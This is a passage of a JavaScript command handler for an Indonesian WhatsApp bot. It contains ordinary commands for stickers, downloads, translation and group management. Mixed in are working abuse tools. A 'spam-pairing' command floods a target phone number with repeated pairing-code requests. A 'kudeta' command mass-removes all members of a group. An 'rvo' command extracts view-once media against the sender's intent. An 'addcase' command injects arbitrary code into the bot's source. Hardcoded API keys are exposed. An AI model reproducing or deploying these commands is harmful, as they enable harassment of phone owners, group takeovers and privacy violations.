    xyu.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================

case 'brat': {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
  if (!quo) return m.reply("masukan teksnya woii");
async function brat(text) {
  try {
    return await new Promise((resolve, reject) => {
      if(!text) return reject("missing text input");
      axios.get("https://brat.caliphdev.com/api/brat", {
        params: {
          text
        },
        responseType: "arraybuffer"
      }).then(res => {
        const image = Buffer.from(res.data);
        if(image.length <= 10240) return reject("failed generate brat");
        return resolve({
          success: true, 
          image
        })
      })
    })
  } catch (e) {
    return {
      success: false,
      errors: e
    }
  }
}

const buf = await brat(quo);
await xyu.imgToSticker(m.chat, buf.image, m, { packname: "Xyuraa", author: "Takashi - Botz" })
}
break

//================================================================================

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await xyu.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: xyu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await xyu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await xyu.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await xyu.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case 'delcase': {
if (!isCreator) return reply(`ᴋʜᴜsᴜs xyura`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./case.js', q)
reply('*Dellcase Successfully*')
}
break

//================================================================================
/*
case 'delsesi':
case 'clear':
case 'ds':
case 'clearsession':{
if (!isCreator) return reply(mess.owner)
fs.readdir("./session", async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return reply(teks)
filteredArray.map(function(e, i) {
teks += (i + 1) + `. ${e}\n`
})
reply(teks)
await sleep(2000)
 reply("Menghapus file sampah...")
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
 reply("Berhasil menghapus semua sampah di folder session")
});
}
break        
*/

case 'hapus': case 'd': case 'delete': case 'del': {
if (!isCreator) return reply(mess.owner) 
if (!m.quoted) return reply('Reply pesan yang ingin dihapus!')
await xyu.sendMessage(from, {delete: {remoteJid: from, id: m.quoted.id, fromMe: m.quoted.fromMe, participant: m.quoted.sender }})
sendReaction("✅")
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await xyu.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await xyu.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await xyu.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await xyu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: xyu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await xyu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break


//================================================================================

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://btch.us.kg/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20Skyzo-AI&text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

case 'gemini-image':  {
async function GeminiImage(image, query) {
    const response = await fetch(`https://ai.xterm.codes/api/img2txt/gemini-image?key=Bell409`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ image, query })
    });

    if (!response.ok) {
        throw new Error('Network response was not ok ' + response.statusText);
    }
    const data = await response.json();
    return data.response;
}
async function RegularAPI(query) {
    const response = await fetch(`https://btch.us.kg/gptgo?text=${encodeURIComponent(query)}`);
    if (!response.ok) {
        throw new Error('Gagal mendapatkan respons dari API');
    }
    const data = await response.json();
    return data.result;
}

let q = m.quoted ? m.quoted : m;
let mime = (q.msg || q).mimetype || '';
    if (!text) return reply(`Example:\n.${command} siapa itu miyako?`);

    try {
        if (mime && mime.startsWith('image/')) {
            let media = await q.download();
            await reply("Please wait...");
            let res = await GeminiImage(media, text);
            reply(`🔮 ${res}`.trim(), m);
        } else {
            let res = await RegularAPI(text);
            reply(`🔮 ${res}`.trim(), m);
        }
    } catch (error) {
        console.error(error);
        reply(m.chat, 'Gagal mendapatkan respons dari API', m);
    }
}
break


//================================================================================


            
case 'sticker':
case 'stiker':
case 's': {
    if (!quoted) {
        return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix + command}\nVideo Duration 1-10 Seconds`);
    }
    await xyu.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await xyu.sendImageAsSticker(m.chat, media, m, {
            packname: global.pack,
            author: global.author 
        });
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) {

            return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`);
        }
        let media = await quoted.download();

        let encmedia = await xyu.sendVideoAsSticker(m.chat, media, m, {

            author: global.author 
        });

    } else {
        return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`);
    }
    await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;

//================================================================================

case 'smeme2': 
{
 if (!text) reply`contoh : smeme Hello|world`
if (/image/.test(mime)) {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await xyu.downloadAndSaveMediaMessage(quoted)
mem = await uploadToCatbox(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`)
                    xyu.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
                }
                }
                break
                
//================================================================================
case 'smeme': 
{
 if (!text) reply`Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await xyu.downloadAndSaveMediaMessage(quoted)
mem = await uploadToCatbox(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
                    xyu.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
                }
                }
                break


//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await xyu.downloadAndSaveMediaMessage(qmsg)
await xyu.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case 'rvo': case 'x': case '🐦': case 'lihat': {
if (!isCreator) return reply(mess.owner) 
if (!m.quoted) return m.reply("dengan reply pesannya")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return xyu.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return xyu.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return xyu.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await xyu.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), '𝐓𝐚𝐤𝐚𝐬𝐡𝐢 - 𝐁𝐨𝐭𝐳.png');

let teks = directLink.toString()
await xyu.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await xyu.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), '𝐓𝐚𝐤𝐚𝐬𝐡𝐢 - 𝐁𝐨𝐭𝐳.png');
let teks = directLink.toString()
await xyu.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tr": case "translate": {
    const lang = args[0]; // Ambil bahasa dari argumen pertama
    const text = m.quoted?.text; // Ambil teks dari pesan yang di-reply
    if (!lang || !text) {
        return m.reply(`Contoh penggunaan:\n- Reply pesan dengan: ${prefix + command} id\n- Reply pesan dengan: ${prefix + command} en`);
    }
    const translate = require('translate-google-api'); // Gunakan translate-google-api
    try {
        const result = await translate(text, { to: lang }); // Terjemahkan teks
        m.reply(result[0]); // Kirim hasil terjemahan
    } catch (e) {
        m.reply(`Error: Bahasa "${lang}" tidak didukung atau terjadi kesalahan.`); // Tangani error
    }
}
break;

//================================================================================

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await xyu.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await xyu.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//================================================================================

case 'add': {
if (!m.isGroup) return reply(mess.group);
if (!isCreator && !isAdmins) return (mess.owner);
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net';
try {
const participants = await xyu.groupMetadata(m.chat);
const memberJids = participants.participants.map(member => member.jid);
if (memberJids.includes(users)) {
m.reply('Target sudah menjadi anggota grup sebelumnya.');
} else {
await xyu.groupParticipantsUpdate(m.chat, [users], 'add');
m.reply('Sukses add target.');
}} catch (err) {
m.reply('Terjadi kesalahan.');
}}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await xyu.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await xyu.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await xyu.groupLeave(m.chat)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await xyu.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await xyu.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await xyu.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await xyu.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "h": case "hidetag": {
if (!m.isGroup) return Reply(mess.group);
if (!isCreator && !m.isAdmin) return Reply(mess.admin);
let text = m.quoted ? m.quoted.text : m.text.split(" ").slice(1).join(" ");
if (!text) return m.reply(example("pesannya"));
let member = m.metadata.participants.map(v => v.id);
await xyu.sendMessage(m.chat, { text: text, mentions: [...member] }, { quoted: m });
}
break;

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await xyu.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case 'upch': {
    if (!isCreator) return reply(mess.owner);

    xyu.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    await sleep(2000);
    xyu.sendMessage(m.chat, { react: { text: '⌛', key: m.key } });

    if (args[0] === "audio") {
        if (!m.quoted) return reply("Reply pesan audio!");
        xyu.sendMessage(`${global.idSaluran}`, {
            audio: await m.quoted.download(),
            mimetype: 'audio/mp4',
            ptt: true
        });
    } else if (args[0] === "video") {
        if (!m.quoted) return reply("Reply pesan video!");
        xyu.sendMessage(`${global.idSaluran}`, {
            video: await m.quoted.download(),
            mimetype: 'video/mp4',
            caption: "Video yang dikirim"
        });
    } else if (args[0] === "text") {
        let text = m.quoted ? m.quoted.text : args.slice(1).join(" ");
        if (!text) return reply("Masukkan atau reply teks!");
        xyu.sendMessage(`${global.idSaluran}`, { text: text });
    } else {
        return reply("Gunakan format: upch <audio|video|text> [pesan]");
    }

    await sleep(2000);
    xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;
//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await xyu.newsletterMetadata("invite", result)
await xyu.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case 'acc': case 'acc-member': {
    if (!m.isGroup) return reply(mess.group); // Hanya bisa digunakan di grup
    if (!isCreator && !isAdmins) return reply(mess.admin); // Hanya admin atau creator yang bisa menggunakan
    try {
        let groupId = m.chat;
        // Mendapatkan daftar permintaan bergabung
        let joinRequestList = await xyu.groupRequestParticipantsList(groupId);
        if (!joinRequestList || joinRequestList.length === 0) {
            return reply("Tidak ada permintaan bergabung yang tertunda.");
        }
        // Menyetujui semua permintaan bergabung
        for (const request of joinRequestList) {
            await xyu.groupRequestParticipantsUpdate(groupId, [request.jid], 'approve');
        }
        // Balasan setelah semua permintaan disetujui
        reply(`✅ Semua permintaan bergabung (${joinRequestList.length}) telah disetujui.`);
    } catch (err) {
        console.error("Error processing acc:", err);
        reply("❌ Terjadi kesalahan saat memproses permintaan bergabung.");
    }
    }
    break;


//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await xyu.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await xyu.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Xyuraa Starting 🔥")
for (let i of memberFilter) {
await xyu.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await xyu.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await xyu.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//================================================================================

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
xyu.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//================================================================================

case 'addcase': {
if (!isCreator) return reply("khusus Xyuraa")
    if (!q) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'case.js';
const caseBaru = `${q}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan!');
            }
        });
    } else {
        reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await xyu.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await xyu.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//================================================================================

case "developerbot": case "owner": {
await xyu.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case 'spam-pairing': case 'spam': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} +6288221325473|150`)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
//================================================================================

case "self": {
if (!isCreator) return
xyu.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//================================================================================

case "public": {
if (!isCreator) return
xyu.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
